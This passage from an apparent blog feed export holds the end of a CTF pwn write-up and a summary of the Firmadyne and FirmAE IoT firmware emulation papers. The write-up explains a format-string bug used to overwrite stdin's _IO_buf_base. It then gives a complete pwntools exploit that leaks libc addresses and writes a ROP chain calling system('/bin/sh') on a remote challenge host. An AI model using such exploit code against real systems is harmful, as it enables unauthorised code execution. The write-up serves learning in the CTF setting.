<p>As <code>_IO_buf_base</code> and <code>_IO_buf_end</code> determine the action of <code>_IO_SYSREAD</code>, we can try to edit them to make it write wherever we want. Since we know the <code>libc base addr</code>, we can get where <code>stdin</code>(<code>_IO_2_1_stdin_</code>) is, therefore we can get where  <code>_IO_buf_base</code> and <code>_IO_buf_end</code> are:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx stdin</span><br><span class="line">_flags, _IO_read_ptr:           0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:        0x00000000fbad208b      0x00007ffff7dd1963</span><br><span class="line">_IO_read_end, _IO_read_base:    0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_write_base, _IO_write_ptr:  0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_write_end, _IO_buf_base:    0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_buf_end, _IO_save_base:     0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;:     0x00007ffff7dd1964      0x0000000000000000</span><br><span class="line">_IO_backup_base, _IO_save_end:  0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;:     0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>Here we first enter <code>set_name()</code> and input the address of <code>_IO_buf_base</code> to let it appear on the stack, then use format string vuln in <code>echo_back()</code> to write only a <code>\x00</code> to its end. It stored <code>0x00007ffff7dd1963</code> before, after overwriting it becomes <code>0x00007ffff7dd1900</code> which points to <code>_IO_write_base</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p * stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt; &quot;&quot;, </span><br><span class="line">  _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Our aim is to edit <code>_IO_buf_base</code> but we better dont change the value in other places. So next we write from where <code>_IO_buf_base</code> points (<code>_IO_write_base</code> &#x3D; <code>_IO_2_1_stdin_+4*8</code>) to where <code>_IO_buf_end</code> points (probably<code>_IO_2_1_stdin_+132</code>). </p>
<p>Recover the value of <code>_IO_write_base</code>, <code>_IO_write_ptr</code> and <code>_IO_write_end</code>, write <code>ret addr</code> of <code>main()</code> to <code>_IO_buf_base</code>, and leave enough room for payload when writing <code>_IO_buf_end</code>. </p>
<p>After that we can write our payload directly to <code>ret addr</code> of <code>main()</code> when we next meet <code>scanf()</code>, but there is still a limit:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
<p>Though every <code>getchar()</code> gets  <code>_IO_read_ptr</code> plus <code>1</code>, there is:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_end += count;</span><br></pre></td></tr></table></figure>
<p>So we have to run <code>len(payload)</code> times of <code>getchar()</code> to bypass this restriction. After the round in which we send payload,  <code>len(payload) - 1</code> rounds are needed.</p>
<p>Finally we can write our payload. Exit to trigger it.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Here it is:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;echo_back&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;36554&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;echo_back&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_back</span>(<span class="params">sth, length=<span class="number">7</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="built_in">str</span>(length)) <span class="comment"># 7 is the max</span></span><br><span class="line">    sh.send(<span class="built_in">str</span>(sth))</span><br><span class="line"></span><br><span class="line">echo_back(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">libc_start_main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment"># leak __libc_start_main for libc base</span></span><br><span class="line">libc_addr = libc_start_main_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">IO_stdin_addr = libc_addr + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">IO_buf_base = IO_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># leak main addr for elf base</span></span><br><span class="line">echo_back(<span class="string">&#x27;%13$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x9c</span> </span><br><span class="line">elf_base = main_addr - <span class="number">0x0c6c</span></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x0d93</span></span><br><span class="line"><span class="comment"># leak old rbp to get ret addr and overwrite</span></span><br><span class="line">echo_back(<span class="string">&#x27;%12$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_rbp = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">main_ret = main_rbp + <span class="number">0x8</span></span><br><span class="line"><span class="comment"># next attack `scanf`</span></span><br><span class="line"><span class="comment"># overwrite lowest digit as 0</span></span><br><span class="line">set_name(p64(IO_buf_base))</span><br><span class="line">echo_back(<span class="string">&#x27;%16$hhn&#x27;</span>)</span><br><span class="line"><span class="comment"># restore other values and change __IO_buf_base </span></span><br><span class="line">payload = p64(IO_stdin_addr + <span class="number">131</span>)*<span class="number">3</span> + p64(main_ret) + p64(main_ret+<span class="number">0x8</span>*<span class="number">3</span>) </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)     <span class="comment"># error if using &#x27;sendlineafter&#x27;     </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)                     <span class="comment"># but the &#x27;\n&#x27; is needed</span></span><br><span class="line"><span class="comment"># to pass if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write final payload</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">final_payload = p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,final_payload) <span class="comment"># here a seperated &#x27;\n&#x27; is also suggested</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>io-file</tag>
      </tags>
  </entry>
  <entry>
    <title>Firmadyne and FirmAE</title>
    <url>/2020/12/13/2020-12-13-Firmadyne-and-FirmAE/</url>
    <content><![CDATA[<p>Since IoT researches are facing analysing problems due to the discrepancy in the real and virtual environment, the full-system emulation is proved to be a trade-off, between the cost of obtaining physical hardwares&#x2F;devices, and the insufficient of static or traditional dynamic analysis.<br>Here we talk about two full-system emulators: <code>Firmadyne</code> and its successor <code>FirmAE</code> which improves the <code>Firmadyne</code>, based on their papers and usages.</p>
<h2 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h2><p>You can find <a class="link"   href="https://github.com/firmadyne/firmadyne" >source code<i class="fas fa-external-link-alt"></i></a> and the paper:<br><a class="link"   href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf" >Towards Automated Dynamic Analysis for Linux-based Embedded Firmware<i class="fas fa-external-link-alt"></i></a> on <a class="link"   href="https://github.com/firmadyne/firmadyne" >Github<i class="fas fa-external-link-alt"></i></a> </p>
<h3 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h3><p>It is their 2016 <a class="link"   href="http://www.internetsociety.org/events/ndss-symposium" >Network and Distributed System Security Symposium (NDSS)<i class="fas fa-external-link-alt"></i></a> paper, titled <a class="link"   href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf" >Towards Automated Dynamic Analysis for Linux-based Embedded Firmware<i class="fas fa-external-link-alt"></i></a>.</p>
<p>They present <code>FIRMADYNE</code>, their implementation of an automated and scalable dynamic analysis technique specifically designed to accurately identify vulnerabilities in Linux-based embedded firmware.<br>It addresses characteristic challenges of embedded systems, such as the presence of hardware-specific peripherals, usage of non-volatile memory (NVRAM), and creation of dynamically generated files.<br><img src="/imghost/ff/firmadyne-arch.png" alt="firmdyne architecture"></p>
<center>Architectural diagram of `FIRMADYNE` showing the emulation life-cycle for an example firmware image, as described</center>

<p>As depicted above, <code>FIRMADYNE</code> consists of four major components.</p>
<h4 id="Acquisition"><a href="#Acquisition" class="headerlink" title="Acquisition"></a>Acquisition</h4><p>This part is about Crawling Firmware.</p>
<p>The web crawler is the first and largely independent component, developed using the <code>Scrapy</code> framework, which downloads firmware images from vendor websites. </p>
<p>Authors manually wrote parsing templates (smart parsers) for each of these websites, allowing to distinguish between firmware images and other undesired binary content. </p>
<p>For dynamic websites that were difficult to crawl automatically, it instead crawled the vendor’s FTP site or collected manually, at the expense of no metadata. </p>
<h4 id="Extraction"><a href="#Extraction" class="headerlink" title="Extraction"></a>Extraction</h4><p>This part is about Extracting Firmware Filesystem.</p>
<p><code>FIRMADYNE</code> uses a custom-written extraction utility built around the <code>binwalk</code> API to extract the kernel (optional) and the root filesystem contained within a firmware image.<br>These were normalized by storing them as compressed <code>TAR</code> archives within the firmware repository.</p>
<p>The built-in recursive extraction mechanism (“Matryoshka”) within <code>binwalk</code> was vulnerable to path explosion, so <code>FIRMADYNE</code> implemented detection of non-firmware files, including blacklisting input files that were any type of structured binary, and extract sequentially in the order of priority-ranked signatures confidence which was corresponding to file types.</p>
<h4 id="Emulation"><a href="#Emulation" class="headerlink" title="Emulation"></a>Emulation</h4><p>This part is about Initial Emulation.<br><img src="/imghost/ff/firmadyne-initial-emu.png" alt="firmdyne initial emulation"><br>Once a filesystem is extracted, <code>FIRMADYNE</code> identifies the hardware architecture of the firmware image. Then, our system uses a pre-built Linux kernel in an instance of the <code>QEMU</code> full system emulator that matches the architecture, endianness, and word-width of the target firmware image. Currently three combinations are supported: <code>little-endian ARM</code>, <code>little-endian MIPS</code>, and <code>big-endian MIPS</code>. </p>
<p>An initial emulation is performed to infer the system and network configuration, achieved by intercepting system calls to the filesystem, networking, and other relevant kernel subsystems.</p>
<p>After collecting information, <code>FIRMADYNE</code> enters the actual emulation phase, in which a matching network environment is configured to communicate with the emulated firmware. A series of network connectivity checks will verify successful network configuration.</p>
<ul>
<li><code>NVRAM</code></li>
</ul>
<p>At least 52.6% of all their extracted images access a hardware non-volatile memory (<code>NVRAM</code>) using a shared library named <code>libnvram.so</code> to persist device-specific configuration parameters. </p>
<p>Since this peripheral is typically abstracted as a key-value store, <code>FIRMADYNE</code> implements a custom <code>NVRAM</code> library to emulate NVRAM-related functions. This custom library is loaded in advance by <code>LD_PRELOAD</code> and intercepts NVRAM-related functions such as <code>const char*nvram_get(const char*key)</code> and <code>int nvram_set(const char*key, char*val)</code>, and emulates an <code>NVRAM</code> without physical access. <code>FIRMADYNE</code> initializes key-value pairs using default files in the given firmware, which typically exist for the factory reset functionality of a device, and it has a list of few hardcoded paths of default files to extract key-value pairs like <code>/etc/nvram.default</code>, <code>/etc/nvram.conf</code> or <code>/var/etc/nvram.default</code>, or symbol <code>router_defaults</code> or <code>Nvrams</code> of type <code>char *[]</code> within built-in libraries such as <code>libnvram.so</code> or <code>libshared.so</code>.</p>
<p>However it does not work if images call un-emulated functions, or they implement <code>NVRAM</code> as a custom data structure on a <code>MTD</code> partition, so the further emulation improvements still require manual process.</p>
<ul>
<li>Kernel</li>
</ul>
<p>It uses custom pre-built kernels instead of extracted kernel.</p>
<p>By hooking 20 system calls using the kernel dynamic probes (<code>kprobes</code>) framework, <code>FIRMADYNE</code> intercepts calls that alter the execution environment, includes operations such as assigning MAC addresses, creating a network bridge, rebooting the system, and executing a program, all of which are monitored by our framework to properly configure the emulated networking environment. This functionality can also be used to provide automatic confirmation of vulnerabilities, especially in conjunction with predefined poison values (e.g., 0xDEADBEEF, 0x41414141).</p>
<p>It also uses <code>rdinit</code> to run custom scripts mounting <code>/dev</code>, <code>/proc</code> etc. at booting, and it loads <code>nandsim</code> kernel module at startup to emulate memory technology device (<code>MTD</code>) partitions accessed via <code>/dev/mtdX</code>.</p>
<ul>
<li>System Configuration</li>
</ul>
<p>It is mainly about network configuration. System initially emulated firmware in a “learning” phase to gather expected network configuration.<br>Then it instantiate a <code>TAP</code> device on the host to associate with emulated network interfaces, sometimes a <code>VLAN</code>.</p>
<ul>
<li>QEMU</li>
</ul>
<p>Since some hardware-specific peripherals (watchdog timers, additional flash storage devices) functionalities are implemented in userspace, instead of kernelspace which can be cleanly emulated with custom kernel module.</p>
<p>So authors modified the appropriate sixteen bytes in QEMU’s source code for the emulated platform flash device to respond with known good values.</p>
<h4 id="Automated-Analysis"><a href="#Automated-Analysis" class="headerlink" title="Automated Analysis"></a>Automated Analysis</h4><p>This part is about Dynamic Analysis.</p>
<p><code>FIRMADYNE</code> implements 3 dynamic analysis passes, each is registered as a callback, such that when a firmware image enters the network inferred state, registered callbacks are triggered sequentially.</p>
<ul>
<li>Accessible Webpages</li>
</ul>
<p>To help detect various information disclosure, buffer overflow, and command injection vulnerabilities, they wrote a <code>Python</code> test harness to verify static resource in the image, and try to access pages via web interface. Then mark pages according to the HTTP response and prioritize for further analysis.</p>
<ul>
<li>SNMP Information</li>
</ul>
<p>A basic analysis out of their curiousity.</p>
<ul>
<li>Vulnerabilities</li>
</ul>
<p>Using 60 known expploits from <code>MSF</code> to check known security vulnerabilities. For new vulnerabilities, they manually developed <code>POC</code> leveraging predefined poisoned args like <code>0xDEADBEEF</code> and set verification condition for check. </p>
<h4 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h4><p>It requires additional manual effort to:</p>
<ul>
<li>fix extraction failures</li>
<li>add support for additional hardware architectures</li>
<li>correct emulation failures</li>
<li>even implement a new analysis pass</li>
</ul>
<p>Since <code>FIRMADYNE</code> uses custom pre-built kernels, which do not load out-of-tree kernel modules from the filesystem. As a result, it cannot confirm vulnerabilities in kernels or kernel modules shipped by venders.</p>
<p>Besides it has problems identifying uplink (or WAN) port and downlink (or LAN) port, preventing us from determining whether detected vulnerabilities are exploitable from the Internet.</p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>The <code>Firmadyne</code> is powerful, however is cubersome to use. </p>
<p>A new <a class="link"   href="https://github.com/attify/firmware-analysis-toolkit" >repo<i class="fas fa-external-link-alt"></i></a> called <code>Firmware Analysis Toolkit</code> (aka <code>FAT</code>) provides more tools (<code>binwalk</code>, <code>Firmadyne</code>) and easier ways for analysing IoT devices. </p>
<p>First of all you have to set up it by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line">$ cd firmware-analysis-toolkit</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure>
<p>After installation remember to edit <code>fat.config</code> and provide <code>sudo</code> password for <code>Firmadyne</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">sudo_password=attify123</span><br><span class="line">firmadyne_path=/home/attify/firmadyne</span><br></pre></td></tr></table></figure>
<p>Get the firmware image and emulate by: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./fat.py &lt;imagename&gt;</span><br></pre></td></tr></table></figure>
<p>Remove analyzed firmware images:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./reset.py</span><br></pre></td></tr></table></figure>
<p>Here is an example (needs to open in a new tab):<br><a href="https://asciinema.org/a/5VryIC2ec1j9SEIfGQ0qAWjoH"><img src="https://asciinema.org/a/5VryIC2ec1j9SEIfGQ0qAWjoH.svg" alt="asciicast"></a><br>As the above shows, we should fix some network errors when using it.</p>
<h2 id="FirmAE"><a href="#FirmAE" class="headerlink" title="FirmAE"></a>FirmAE</h2><p>It releases <a class="link"   href="https://github.com/pr0v3rbs/FirmAE" >source code<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/pr0v3rbs/FirmAE/releases/tag/v1.0" >cross-compiled utils<i class="fas fa-external-link-alt"></i></a>, and the paper:<br><a class="link"   href="https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf" >FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Paper-1"><a href="#Paper-1" class="headerlink" title="Paper"></a>Paper</h3><p>It is titled <a class="link"   href="https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf" >FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis<i class="fas fa-external-link-alt"></i></a></p>
<p>We can observe that a slight change in a configuration or device settings, which is easy to apply, may let firmware emulation run without suffering emulation discrepancy problem, which is difficult to handle. </p>
<p>In this regard, authors believe that <code>FIRMADYNE</code> misses many chances of emulating and analyzing IoT firmware images not because of fundamental problems in emulation but because of device setup failures, although these can be easily handled. </p>
<p>To address this issue, they aim at systematizing such heuristics via analyzing many emulation failure cases, and conclude that failure cases in each category can be resolved by applying simple heuristics even though they originate from different root causes.</p>
<p>Most failure cases fall into the following five categories of problems: </p>
<ol>
<li>boot-related problems, such as an incorrect boot sequence or absence of files, </li>
<li>network-related problems, such as mismatches of network interface or improper configuration, </li>
<li>non-volatile RAM (NVRAM)-related problems, such as missing library functions or customized formats, </li>
<li>kernel-related problems, such as unsupported hardware or functions, and </li>
<li>minor problems, such as unsupported commands or timing issues.</li>
</ol>
<p>The architecture of it:<br><img src="/imghost/ff/firmae-arch.png" alt="firmdyne architecture"></p>
<center>FirmAE architecture overview</center>

<p>For the emulation, They specifically focus on emulating web services of wireless routers and IP cameras.</p>
<h4 id="Arbitrated-emulation"><a href="#Arbitrated-emulation" class="headerlink" title="Arbitrated emulation"></a>Arbitrated emulation</h4><p>They systemize the heuristics as arbitrated emulation to bypass the failure cases.</p>
<p>Instead of strictly following the execution behavior of the firmware as is, arbitrated emulation arbitrates between following the original behavior or injecting proper interventions, i.e., intentional operations.<br>Thereby, it may slightly alter the original behavior of the firmware. However, the goal is not to build an environment identical to the physical device, but to create an environment conducive to the dynamic analysis.</p>
<p>The key idea behind arbitrated emulation is that ensuring high-level behavior is sufficient to perform dynamic analysis on internal programs, which is relatively easy to do, rather than finding and fixing the exact root causes of emulation failures.</p>
<p>To solve corresponding failures of <code>Firmadyne</code>, They proposed some arbitrations.</p>
<h4 id="Boot-Arbitrations"><a href="#Boot-Arbitrations" class="headerlink" title="Boot Arbitrations"></a>Boot Arbitrations</h4><ul>
<li>improper booting sequence</li>
</ul>
<p>Firmware has custom paths for initializing program.</p>
<p><code>Firmadyne</code> built a script that searches and executes a hard-coded list of files frequently accessed for initializing programs. </p>
<p><code>FirmAE</code> extracts useful information in the kernel of the image. Specifically, it utilizes a kernel’s command line string, which is used for default configuration of the kernel in the booting procedure.</p>
<ul>
<li>missing filesystem structure</li>
</ul>
<p>Failure cases occur due to the absence of files or directories.</p>
<p><code>Firmadyne</code> attempted to address this by creating and mounting hard-coded paths such as proc, dev, sys, or root at the beginning of the custom booting script.</p>
<p>Similar to the previous case, but <code>FirmAE</code> extracted all strings from executable binaries in its filesystem ranther kernel, before emulating a given image. Then, it filtered them to obtain strings that are highly likely to indicate paths and prepared the file structure based on the paths.</p>
<h4 id="Network-Arbitrations"><a href="#Network-Arbitrations" class="headerlink" title="Network Arbitrations"></a>Network Arbitrations</h4><ul>
<li>invalid IP alias handling</li>
</ul>
<p>IP aliasing is assigning multiple IP addresses to a network interface. </p>
<p><code>Firmadyne</code> implements by adding static routing rules to <code>TAP</code> in the host, which makes network collide.</p>
<p><code>FirmAE</code> lets the host use its default routing rule, because packets can be routed to any devices connected to <code>TAP</code> without interventions.</p>
<ul>
<li>no network information</li>
</ul>
<p>This is beacuse some firmwares rely on <code>DHCP</code> server, others may rely on peripherals.</p>
<p><code>FirmAE</code> arbitrates these cases with an intervention that forcibly configures the network with a default setting. Specifically, we set an Ethernet interface, <code>eth0</code>, with an IP address of <code>192.168.0.1</code>.</p>
<ul>
<li>multiple network interfaces in <code>ARM</code></li>
</ul>
<p>On <code>ARM</code> handling multiple network interfaces will meet errors that dont exist on other platforms.</p>
<p>Nevertheless, we could address the failure with a high-level intervention that forcibly sets up only one Ethernet interface, <code>eth0</code>, and avoids setting the other interfaces. </p>
<ul>
<li>insufficient VLAN setup</li>
</ul>
<p><code>Firmadyne</code> attempts to address it by running a command when setting host <code>TAP</code> interface, however it forgets to set host’s <code>VLAN</code> id (sometimes it should be the same as guests’) , which causes errors. <code>FirmAE</code> arbitrates this by properly configuring <code>VLAN</code>.</p>
<ul>
<li>filtering rules in iptables</li>
</ul>
<p>Since many devices are wrongly configured to be accessible publicly, <code>FirmAE</code> choose to remove existing filtering rules, by flushing all <code>iptables</code> policies and setting the default to accept all incoming packets.</p>
<h4 id="NVRAM-Arbitrations"><a href="#NVRAM-Arbitrations" class="headerlink" title="NVRAM Arbitrations"></a>NVRAM Arbitrations</h4><ul>
<li>supporting custom <code>NVRAM</code> default files</li>
</ul>
<p><code>FirmAE</code> records all the key-value pairs accessed with the <code>nvram_get()</code> and <code>nvram_set()</code> functions during the pre-emulation. Then for key names whose values are unknown, it scans the filesystem of the target firmware and searches files that contain them. <code>FirmAE</code> extracts the key-value pairs from the files (if they exist) and utilizes them in the final emulation.</p>
<ul>
<li>no <code>NVRAM</code> default file</li>
</ul>
<p><code>Firmadyne</code> addresses this issue by returning the <code>NULL</code> value for uninitialized keys.</p>
<p><code>FirmAE</code> handles this by arbitrating the behavior of the <code>nvram_get()</code> function. Instead of returning the <code>NULL</code> value when accessing uninitialized keys, <code>FirmAE</code> returns a pointer to an empty string.</p>
<h4 id="Kernel-Arbitrations"><a href="#Kernel-Arbitrations" class="headerlink" title="Kernel Arbitrations"></a>Kernel Arbitrations</h4><ul>
<li>insufficient support of kernel module</li>
</ul>
<p>Since <code>Firmadyne</code> implemented dummy modules with hard-coded device names and <code>ioctl</code> commands, some programs fail when accessing kernel modules with a different configuration.</p>
<p>As numerous kernel modules are accessed through shared libraries, <code>FirmAE</code> intercepts library function calls similarly to handling NVRAM issues. Every lib func call gets a pre-defined value returned.</p>
<ul>
<li>Improper kernel version</li>
</ul>
<p><code>Firmadyne</code> customized Linux kernel v2.6.32 in the firmware emulation. However, recent embedded devices use a newer version of the kernel.</p>
<p><code>FirmAE</code> tested Linux kernel v4.1.17, finding that the <code>ASLR</code> is not compatible with old versions of libc, so authors used compatibility option (set <code>CONFIG_COMPAT_BRT</code>, excluding randomizing <code>brk</code> area in heap memory) when compiling new kernel.</p>
<h4 id="Other-arbitrations"><a href="#Other-arbitrations" class="headerlink" title="Other arbitrations"></a>Other arbitrations</h4><ul>
<li>unexecuted web servers</li>
</ul>
<p>It will search for widely used web servers like <code>httpd</code>, <code>lighttpd</code>, <code>boa</code> and <code>goahead</code> and their configs, then forcibly executes them.</p>
<ul>
<li>timeout issues</li>
</ul>
<p><code>Firmadyne</code> use a 60 s timeout, then the program will be forcibly stopped.</p>
<p><code>FirmAE</code> investigated such cases and empirically found a suitable timeout of 240 s.</p>
<ul>
<li>lack of tools for emulation</li>
</ul>
<p>It adds latest version of <code>busybox</code> into the filesystem of the target firmware, which enables essential commands, and leads to successful emulation.</p>
<h4 id="Automated-Analysis-1"><a href="#Automated-Analysis-1" class="headerlink" title="Automated Analysis"></a>Automated Analysis</h4><p>The analysis engine consists of two parts: it automatically initializes and logs into web pages if necessary, and identifies vulnerabilities including memory corruption bugs. </p>
<ul>
<li>initializing web services</li>
</ul>
<p>A large portion of the web services in our dataset require a network and security configuration. It leveraged Selenium to automate the process.</p>
<ul>
<li>evaluating vulnerability discovery performance</li>
</ul>
<p>To find 1-day vulnerabilities it utilized <code>RouterSploit</code> and the customized PoC codes.</p>
<p>To find 0-day vulnerabilities, it extracts information from filesystem and constructs a valid request template for fuzzing. By searching filesystem, it could also check web services that are not reachable by crawling.</p>
<h3 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h3><p>Install it first:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone --recursive https://github.com/pr0v3rbs/FirmAE</span><br><span class="line">$ ./download.sh</span><br><span class="line">$ ./install.sh</span><br></pre></td></tr></table></figure>
<p>Initialize before emulation:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./init.sh</span><br></pre></td></tr></table></figure>
<p>Then check emulation, like the pre-emulation:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo ./run.sh -c &lt;brand&gt; &lt;firmware&gt;</span><br></pre></td></tr></table></figure>
<p>Finally run analysis:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo ./run.sh -a &lt;brand&gt; &lt;firmware&gt;</span><br></pre></td></tr></table></figure>
<p>There are four modes to emulate:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./run.sh</span><br><span class="line">Usage: ./run.sh [mode]... [brand] [firmware|firmware_directory]</span><br><span class="line">mode: use one option at once</span><br><span class="line">      -r, --run     : run mode     - run emulation (no quit)</span><br><span class="line">      -c, --check   : check mode   - check network reachable and web access (quit)</span><br><span class="line">      -a, --analyze : analyze mode - analyze vulnerability (quit)</span><br><span class="line">      -d, --debug   : debug mode   - debugging emulation (no quit)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>qemu</tag>
        <tag>arm</tag>
